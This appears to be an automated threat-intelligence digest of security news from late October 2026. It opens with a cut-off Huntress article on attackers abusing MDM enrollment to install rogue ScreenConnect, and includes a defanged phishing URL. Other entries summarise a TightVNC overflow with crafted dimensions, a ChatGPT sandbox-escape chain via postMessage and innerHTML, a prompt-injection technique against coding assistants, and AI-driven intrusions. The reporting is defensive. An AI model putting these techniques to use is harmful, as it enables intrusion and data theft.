- confidence_tier: tier_2_operator

#### Summary

```
Attackers abuse legitimate MDM platforms to deploy rogue RMM tools, turning device management into a pathway for remote access and persistence.
```

#### Full body

```
Home Blog Managed for Malice: How Attackers Turn MDM into Remote Access Published: October 28, 2026 Managed for Malice: How Attackers Turn MDM into Remote Access By: Ben Nahorney Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways Huntress is seeing attackers abusing legitimate MDM platforms – like Hexnode and Rippling – by using social engineering to enroll devices or install management agents. Once established, MDM provides a trusted, privileged path for malicious activity, such as deploying rogue RMM tools and maintaining remote access. The deployment chain can vary, so defenders should monitor unexpected MDM enrollments, management agents, RMM services, and external relay connections. Acknowledgements: Special thanks to Lindsey Welch, Anton Ovrutsky, and Harlan Carvey for their contributions to this investigation and writeup. Background Huntress has observed several incidents recently where threat actors have leveraged mobile device management (MDM) applications to carry out attacks. In these cases, legitimate management tools are being weaponized for malicious purposes, as opposed to threat actors taking advantage of inherent weaknesses in the applications themselves, such as vulnerabilities. MDM platforms are legitimate tools that organizations use to manage employee laptops, phones, and other devices. These tools help IT teams to enroll and configure company devices remotely, enforce security policies, and deploy approved applications. However, these applications' centralized control and trusted level of access can create an entry point for threat actors if the tools are misused. These incidents often begin with social engineering—users falling subject to business-themed lures that arrive through messaging applications and email. While not a definitive list of MDMs that could be used in such attacks, we have seen threat actors recently using well-known applications from Hexnode and Rippling. Once registered with the MDM application, the attacker gains a trusted and privileged management path on the system. In both cases described here, Huntress observed the threat actors installing unauthorized RMM (remote monitoring and management) tools in order to further their attacks. Mystery of the reappearing ScreenConnect Imagine receiving an alert for an unauthorized ScreenConnect installation. Naturally, given the severity of such an alert, you prioritize it and remove the ScreenConnect agent immediately. However, several hours later, you receive another alert—same unauthorized installation. Something's clearly going on behind the scenes. A recurring ScreenConnect installation is the first clue that this is more than an isolated, rogue RMM deployment. If both installations connected to the same destination relay, this would suggest the same threat actor was involved both times. So how are they managing to get back in after being removed once? We observed this activity in a recent incident, where two Huntress alerts for unauthorized ScreenConnect activity on the same device, separated by several hours, connected to the same relay. As it happened, a threat actor had previously managed to install an MDM client from Hexnode on the system that ScreenConnect kept appearing on. Removing the RMM did little to deter them. They simply staged and installed the RMM software again. The attack began with a phishing email. The target received several emails with proposal-related subjects like "ATTN: Official Invitation to Submit Proposal" and "Review Required" that mentioned an organization that the target likely had a business relationship with. Clicking a link contained within the email downloaded a file from https://webdocusign.viewportal[.]es/Windows/download/index.php which was saved to the Microsoft Edge temporary downloads folder as eD0cuSign_Installer.msi . While the file had been named to mimic a DocuSign installer, it actually contained an installation package for a Hexnode MDM, a legitimate device managem
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Managed for Malice: How Attackers Turn MDM into Remote Access
  - Published: 2026-10-28T16:00:00+00:00
  - Link: https://www.huntress.com/blog/attackers-turn-mdm-into-remote-access
  - Summary: Attackers abuse legitimate MDM platforms to deploy rogue RMM tools, turning device management into a pathway for remote access and persistence.

### Cluster c1a7215ab3 — score 8

- Title: Camera Management Software Compromise Leads to Malware Deployment
- Source: Huntress (detection_response_operations)
- Published: 2026-10-27T13:00:00+00:00
- Link: https://www.huntress.com/blog/camera-management-software-compromise-malware
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Attackers compromised camera management software to deploy malware, establish persistence, and beacon to C2. Huntress breaks down the attack chain and IOCs.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Camera Management Software Compromise Leads to Malware Deployment
  - Published: 2026-10-27T13:00:00+00:00
  - Link: https://www.huntress.com/blog/camera-management-software-compromise-malware
  - Summary: Attackers compromised camera management software to deploy malware, establish persistence, and beacon to C2. Huntress breaks down the attack chain and IOCs.

### Cluster 2754977745 — score 8

- Title: AI, Scripts, Operator: Inside the ConnectWise Attack
- Source: Huntress (detection_response_operations)
- Published: 2026-10-26T19:00:00+00:00
- Link: https://www.huntress.com/blog/connectwise-attack-ai
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Microsoft says an AI agent drove the ConnectWise attack. Huntress telemetry is consistent with that: scripted tooling, steered by an operator.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: AI, Scripts, Operator: Inside the ConnectWise Attack
  - Published: 2026-10-26T19:00:00+00:00
  - Link: https://www.huntress.com/blog/connectwise-attack-ai
  - Summary: Microsoft says an AI agent drove the ConnectWise attack. Huntress telemetry is consistent with that: scripted tooling, steered by an operator.

### Cluster 1e5dc997fa — score 8

- Title: Chainalysis discloses data breach from "offensive agentic techniques"
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-31T12:50:09+00:00
- Link: https://www.bleepingcomputer.com/news/security/chainalysis-discloses-data-breach-from-offensive-agentic-techniques/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Blockchain analytics firm Chainalysis disclosed a data breach after attackers used "offensive agentic techniques" to access internal systems and tools, exposing customer names, email addresses, user IDs, and organizational roles. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Chainalysis discloses data breach from "offensive agentic techniques"
  - Published: 2026-10-31T12:50:09+00:00
  - Link: https://www.bleepingcomputer.com/news/security/chainalysis-discloses-data-breach-from-offensive-agentic-techniques/
  - Summary: Blockchain analytics firm Chainalysis disclosed a data breach after attackers used "offensive agentic techniques" to access internal systems and tools, exposing customer names, email addresses, user IDs, and organizational roles. [...]

### Cluster cd1d6d7c27 — score 8

- Title: Leak site publishes data on more than 41,000 DHS employees obtained by hacktivists
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-10-28T21:33:00+00:00
- Link: https://cyberscoop.com/dhs-employee-data-leak-ddosecrets/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The Department of Peace group shared it with Swiss hacker/journalist maia arson crimew and DDoSecrets put it online. The post Leak site publishes data on more than 41,000 DHS employees obtained by hacktivists appeared first on CyberScoop .
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Leak site publishes data on more than 41,000 DHS employees obtained by hacktivists
  - Published: 2026-10-28T21:33:00+00:00
  - Link: https://cyberscoop.com/dhs-employee-data-leak-ddosecrets/
  - Summary: The Department of Peace group shared it with Swiss hacker/journalist maia arson crimew and DDoSecrets put it online. The post Leak site publishes data on more than 41,000 DHS employees obtained by hacktivists appeared first on CyberScoop .

### Cluster 66b3516719 — score 8

- Title: In-the-Wild Attack Abuses AI Agents' Trust in Markdown
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-10-26T20:59:26+00:00
- Link: https://www.darkreading.com/application-security/in-the-wild-attack-ai-agents-trust-markdown
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ai_security
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ai_security, active_exploitation
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A new AI agent prompt injection technique exploits how coding assistants consume local instruction files, blurring the line between text documents and executable actions.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: In-the-Wild Attack Abuses AI Agents' Trust in Markdown
  - Published: 2026-10-26T20:59:26+00:00
  - Link: https://www.darkreading.com/application-security/in-the-wild-attack-ai-agents-trust-markdown
  - Summary: A new AI agent prompt injection technique exploits how coding assistants consume local instruction files, blurring the line between text documents and executable actions.

### Cluster f39d9bb720 — score 8

- Title: Critical Langflow Flaws Could Let Unauthenticated Attackers Run Code on Servers
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-02T11:50:00+00:00
- Link: https://thehackernews.com/2026/11/critical-langflow-flaws-could-let.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Two critical flaws in Langflow could let a remote attacker with no account bypass authentication or run arbitrary code, IBM said last week. Langflow is an open-source tool for building AI agents and workflows, and its vulnerability reports go to IBM. Every release from 1.0.0 through 1.12.8 has the flaws, and the only fix is version 1.13.0. Neither flaw is in CISA's Known
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical Langflow Flaws Could Let Unauthenticated Attackers Run Code on Servers
  - Published: 2026-11-02T11:50:00+00:00
  - Link: https://thehackernews.com/2026/11/critical-langflow-flaws-could-let.html
  - Summary: Two critical flaws in Langflow could let a remote attacker with no account bypass authentication or run arbitrary code, IBM said last week. Langflow is an open-source tool for building AI agents and workflows, and its vulnerability reports go to IBM. Every release from 1.0.0 through 1.12.8 has the flaws, and the only fix is version 1.13.0. Neither flaw is in CISA's Known

### Cluster 164e3991c3 — score 8

- Title: TightVNC Viewer Pre-auth RCE
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-10-29T14:09:08+00:00
- Link: https://www.reddit.com/r/netsec/comments/1xil17j/tightvnc_viewer_preauth_rce/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Summary

```
What if a VNC server could make your viewer believe it had a ~4 GB framebuffer… while actually allocating only 128 KB? That’s the core of this TightVNC vulnerability. A malicious server can announce a crafted 32768 × 32769 screen at 32bpp, causing the framebuffer size calculation to overflow. The allocation wraps down to 128 KB, but the viewer continues using the original, much larger dimensions when calculating pixel writes. The result is a server-controlled out-of-bounds write in the viewer. It’s a good example of how a relatively small integer-overflow mistake can become a powerful memory-corruption primitive when different parts of the application disagree about the true size of a buffer. submitted by /u/SSDisclosure [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: TightVNC Viewer Pre-auth RCE
  - Published: 2026-10-29T14:09:08+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xil17j/tightvnc_viewer_preauth_rce/
  - Summary: What if a VNC server could make your viewer believe it had a ~4 GB framebuffer… while actually allocating only 128 KB? That’s the core of this TightVNC vulnerability. A malicious server can announce a crafted 32768 × 32769 screen at 32bpp, causing the framebuffer size calculation to overflow. The allocation wraps down to 128 KB, but the viewer continues using the original, much larger dimensions when calculating pixel writes. The result is a server-controlled out-of-bounds write in the viewer. It’s a good example of how a relatively small integer-overflow mistake can become a powerful memory-corruption primitive when different parts of the application disagree about the true size of a buffer. submitted by /u/SSDisclosure [link] [comments]

### Cluster 43b7acdd25 — score 8

- Title: How We Took Over ChatGPT Accounts
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-10-31T23:15:22+00:00
- Link: https://simonwillison.net/2026/Oct/31/how-we-took-over-chatgpt-accounts/
- Fetch status: not_attempted
- Member count: 3
- Corroborating source count: 3
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- affected_products: OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
How We Took Over ChatGPT Accounts Parameter Labs describe an exploit they found against ChatGPT's implementation of the artifacts pattern (OpenAI used to call this "Canvas" but it looks like the latest revision is called HTML previews ), where interactive custom HTML apps are displayed in a sandboxed iframe. It's important that HTML in these stays tightly sandboxed to avoid untrusted code interacting with OpenAI APIs and accessing private data. Parameter found quite a complex attack chain. OpenAI use the MathLive JavaScript library as part of their graph support, and that library includes its own virtual keyboard , which can be triggered in the parent page via postMessage() from the sandboxed iframe. That message receiving code uses innerHTML , so anything that sends a message can add custom HTML to the parent - and there was no mechanism to prevent other sandboxed frames, including HTML preview frames, from calling that method. This meant untrusted code in an iframe could insert HTML,
```

#### Corroborating sources (3)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: How We Took Over ChatGPT Accounts
  - Published: 2026-10-31T23:15:22+00:00
  - Link: https://simonwillison.net/2026/Oct/31/how-we-took-over-chatgpt-accounts/
  - Summary: How We Took Over ChatGPT Accounts Parameter Labs describe an exploit they found against ChatGPT's implementation of the artifacts pattern (OpenAI used to call this "Canvas" but it looks like the latest revision is called HTML previews ), where interactive custom HTML apps are displayed in a sandboxed iframe. It's important that HTML in these stays tightly sandboxed to avoid untrusted code interacting with OpenAI APIs and accessing private data. Parameter found quite a complex attack chain. OpenAI use the MathLive JavaScript library as part of their graph support, and that library includes its own virtual keyboard , which can be triggered in the parent page via postMessage() from the sandboxed iframe. That message receiving code uses innerHTML , so anything that sends a message can add custom HTML to the parent - and there was no mechanism to prevent other sandboxed frames, including HTML preview frames, from calling that method. This meant untrusted code in an iframe could insert HTML,
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: A Shared ChatGPT Link Could Run Attacker Code in Your Session and Read Private Chats
  - Published: 2026-10-31T05:33:41+00:00
  - Link: https://thehackernews.com/2026/10/a-shared-chatgpt-link-could-run.html
  - Summary: A malicious ChatGPT share link could run an attacker's code in the logged-in session of anyone who opened it, allowing them to read their private conversations, researchers at the security firm Parameter showed. The researchers reported the flaw through OpenAI's bug bounty program on October 18, and OpenAI fixed it eight days later and rated it P1, its most serious category.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: NIK C2 Malware Can Use Victims’ OpenAI Keys for AI Queries
  - Published: 2026-10-29T15:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/nik-c2-malware-victims-openai-keys/
  - Summary: NIK C2 malware can fall back on victims’ OpenAI API keys to run AI queries
